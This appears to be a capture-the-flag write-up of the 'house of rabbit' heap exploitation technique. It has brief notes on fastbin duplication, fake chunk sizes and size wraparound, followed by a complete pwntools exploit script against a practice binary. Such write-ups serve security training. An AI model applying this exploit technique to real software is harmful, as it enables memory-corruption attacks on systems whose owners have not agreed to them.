![](../img/house_of_rabbit-1785979361145.webp)

![](../img/house_of_rabbit-1785979561747.webp)

the challenge let us malloc 4 fast chunks other chunks, while also letting us modify the "age" variable, which is in user0, slightly below our target

![](../img/house_of_rabbit-1785979431930.webp)

we are allowed to read 0x10 bytes when the malloc option is used

with that, we can commit a fastbin_dup to link our a fake chunk with the age as the size field to the fastbin 

![](../img/house_of_rabbit-1785979633205.webp)

then we can trigger consolidate fast bin to push our fake chunk into unsorted bin by freeing the chunk that border the top chunk 

after growing the max_size of the arena by malloc a bunch of 0x20000 chunk, we can then try to change our fake chunk to size 0x80000, and request a chunk of 0x80010 so that our chunk is in the largest largebin, a bin without maximum size request 

then, by changing our fake chunk to size -0x10, we can malloc a chunk so big that it wraps around the VA and create a freed chunk above our target for us to malloc, and edit the value

```
#!/usr/bin/env python3

from pwn import *

exe = ELF("./house_of_rabbit")

context.binary = exe
context.log_level="debug"

script='''
c
'''

def malloc(size, data):
    r.recvuntil(">")
    r.sendline("1")
    r.recvuntil("size:")
    r.sendline(str(size).encode())
    r.recvuntil("data:")
    r.send(data)

def free(index):
    r.recvuntil(">")
    r.sendline("2")
    r.recvuntil("index:")
    r.sendline(str(index).encode())

def age(num):
    r.recvuntil(">")
    r.sendline("3")
    r.recvuntil("age:")
    r.sendline(str(num).encode())


def main():
    global r
    # r=gdb.debug(exe.path,gdbscript=script)
    r = process(exe.path)

    filler=b"\x00"

    r.sendline(str(0x1).encode())
    malloc(0x18,filler)
    malloc(0x18,filler)

    malloc(0x60000,filler)

    free(2)

    malloc(0x60000,filler)

    free(0)
    free(1)
    free(0)

    malloc(0x18,flat(0x602040,0))
    malloc(0x88,filler)

    free(5)

    age(0x80001)

    malloc(0x80000,filler)

    age(-0xf)

    malloc(-0x50,filler)

    payload=flat(
        "PWNED",
        0
    )

    malloc(0x28,payload)

    r.recvuntil(">")
    r.sendline("4")

    r.interactive()


if __name__ == "__main__":
    main()
```
